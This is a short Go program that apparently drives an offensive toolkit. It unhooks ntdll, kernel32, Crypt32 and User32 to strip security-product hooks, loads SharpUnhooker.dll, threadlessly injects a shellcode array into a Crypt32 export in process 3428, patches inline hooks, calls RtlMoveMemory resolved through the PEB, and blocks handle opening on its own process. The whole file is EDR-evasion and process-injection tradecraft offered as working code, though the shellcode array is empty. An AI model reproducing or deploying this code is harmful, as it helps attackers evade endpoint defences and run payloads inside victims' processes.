package main

import (
	"UnhookingGoLang/BlockOpenHandle"
	"UnhookingGoLang/EATUnhooker"
	"UnhookingGoLang/ExportAddressTable"
	"UnhookingGoLang/JMPUnhooker"
	"UnhookingGoLang/PatchInlineHooking"
	"UnhookingGoLang/ThreadlessInject"
	"syscall"
)

func main() {
	DllName := []string{"ntdll.dll", "kernel32.dll", "Crypt32.dll", "User32.dll"}
	for _, dllName := range DllName {
		JMPUnhooker.Dll(dllName)
		EATUnhooker.Dll(dllName)
	}

	syscall.LoadLibrary("SharpUnhooker/SharpUnhooker.dll")

	shellcode := []byte{}
	ThreadlessInject.Inject("Crypt32", "CertEnumSystemStore", 3428, shellcode)

	PatchInlineHooking.Inline()

	FuncAddr := ExportAddressTable.GetProcAddressFromEAT(ExportAddressTable.GetPEBNtdll(), "RtlMoveMemory")
	syscall.SyscallN(FuncAddr)

	BlockOpenHandle.SetProcessSecurityDescriptor()
}
